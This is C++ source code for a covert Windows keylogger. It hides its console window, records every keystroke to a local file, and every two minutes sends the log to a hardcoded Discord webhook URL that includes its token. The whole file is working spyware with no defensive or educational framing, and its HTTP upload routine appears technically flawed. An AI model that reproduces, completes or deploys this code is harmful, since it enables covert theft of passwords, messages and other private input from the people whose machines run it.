#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <ctime>
#include <string>
using namespace std;

void StealthMode();
void key();
void SendOutputToDiscordWebhook(const string& fileName, const string& webhookUrl);

int main() {
    StealthMode();
    key();
    return 0;
}

void key() {
    char c;
    string fileName = "Record2.txt";

    for (;;) {
        ofstream write(fileName, ios::app);
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                if (write.is_open()) {
                    if (c == VK_RETURN) {
                        write << endl;
                    } else if (c == VK_SPACE) {
                        write << " ";
                    } else if (c == VK_BACK) {
                        write << "<BACKSPACE>";
                    } else if (c == VK_DELETE) {
                        write << "<DEL>";
                    } else {
                        write << c;
                    }
                }
            }
        }
        write.close();

        // Send logs to Discord webhook every 2 minutes
        Sleep(120000);  // Sleep for 2 minutes
        SendOutputToDiscordWebhook(fileName, "https://discord.com/api/webhooks/1059819241957773412/68iCYTlEdChwAJ2fjqXgbwQQD6UDnRooW5iZBRPH9cnw3K76yDfhcq2jSVBxbEwu-q9E");
    }
}

void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void SendOutputToDiscordWebhook(const string& fileName, const string& webhookUrl) {
    ifstream file(fileName);
    string content((istreambuf_iterator<char>(file)), (istreambuf_iterator<char>()));
    file.close();

    HINTERNET hInternet = InternetOpen(L"HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, webhookUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

    string data = "content=" + content;
    const char* pData = data.c_str();
    DWORD dwSize = strlen(pData);
    DWORD dwDownloaded = 0;
    if (hConnect) {
        InternetWriteFile(hConnect, pData, dwSize, &dwDownloaded);
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hInternet);
}